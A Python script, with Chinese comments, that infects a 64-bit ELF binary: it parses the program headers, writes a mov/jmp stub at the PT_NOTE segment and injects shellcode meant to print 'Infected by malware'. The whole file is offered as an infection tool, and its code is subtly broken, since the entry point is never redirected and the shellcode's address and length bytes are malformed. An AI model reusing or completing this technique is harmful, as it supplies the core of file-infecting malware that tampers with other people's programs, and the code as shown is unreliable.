
import struct

# 定义 ELF 和程序头的结构 (64-bit)
ELF_HEADER_FMT = '16sHHIQQQIHHHHHH'
PROGRAM_HEADER_FMT = 'IIQQQQQQ'

# 读取 ELF 头部
def read_elf_header(fd):
    fd.seek(0)
    elf_header_data = fd.read(struct.calcsize(ELF_HEADER_FMT))
    return struct.unpack(ELF_HEADER_FMT, elf_header_data)

# 读取程序头部
def read_program_headers(fd, elf_header):
    phoff = elf_header[5]  # e_phoff: 程序头表的偏移量
    phnum = elf_header[9]  # e_phnum: 程序头表的条目数量
    fd.seek(phoff)
    
    program_headers = []
    for _ in range(phnum):
        ph_data = fd.read(struct.calcsize(PROGRAM_HEADER_FMT))
        program_headers.append(struct.unpack(PROGRAM_HEADER_FMT, ph_data))
    return program_headers

# 插入跳转指令到 PT_NOTE 段
# 修改跳转地址计算 (current_address 要根据程序头实际位置调整)
def modify_ptnote(fd, ptnote_header, target_address):
    jmp_instruction = (
        b'\x48\xB8' + struct.pack('<Q', target_address) +  # mov rax, target_address (64 位)
        b'\xFF\xE0'  # jmp rax
    )


    # 写入 movabs 和 jmp rax 到 PT_NOTE 段
    fd.seek(ptnote_header[3])
    fd.write(jmp_instruction)
    print(f"Inserted movabs+jmp instruction to PT_NOTE segment, jumping to address: {target_address:x}")



# 向 PT_LOAD 段插入自定义输出的 shellcode
def inject_payload(fd, target_address):
    # 使用 write 系统调用输出 "Infected by malware\n"
    shellcode = (
        b"\x48\x31\xC0"                      # xor rax, rax (清空 rax)
        b"\xB0\x01"                          # mov al, 1 (sys_write)
        b"\x48\x31\xFF"                      # xor rdi, rdi
        b"\x40\xB7\x01"                      # mov dil, 1 (标准输出 stdout)
        b"\x48\x31\xF6"                      # xor rsi, rsi
        b"\x48\xBE\x01\x00\x00\x00\x00\x00"  # mov rsi, 目标内存地址 (payload)
        b"\x00\x00"                          # rsi 完整地址
        b"\x48\x31\xD2"                      # xor rdx, rdx
        b"\x48\xBA\x0F\x00\x00\x00"          # mov rdx, 15 (字符串长度)
        b"\x0F\x05"                          # syscall (执行系统调用)
        b"\xC3"                              # ret (返回)
    )

    #  shellcode    
  # p_offset + p_filesz

    fd.seek(target_address - 0x555555554000)
    fd.write(b'infected') 

    #write shellcode in file
    fd.write(shellcode)

    print("Injected custom output into PT_LOAD segment.")

def main():
    filename = "hello"  # 目标 ELF 文件
    shellcode_address = 0x555555555500  # 有写权限的地址
    jump_address = shellcode_address  # 跳转到 shellcode 地址


    with open(filename, "r+b") as fd:
        elf_header = read_elf_header(fd)  # 读取 ELF 文件头
        program_headers = read_program_headers(fd, elf_header)  # 读取程序头

        ptnote = None
        for ph in program_headers:
            if ph[0] == 4:  # 查找 PT_NOTE 段
                ptnote = ph

        if ptnote:
            # 修改 PT_NOTE 段，插入 MOV RAX, <target_address> 和 JMP RAX
            modify_ptnote(fd, ptnote, jump_address)

            # 注入 shellcode 到可写的 PT_LOAD 段
            inject_payload(fd, shellcode_address)

            print("ELF infection completed.")
        else:
            print("PT_NOTE segment not found.")

if __name__ == "__main__":
    main()
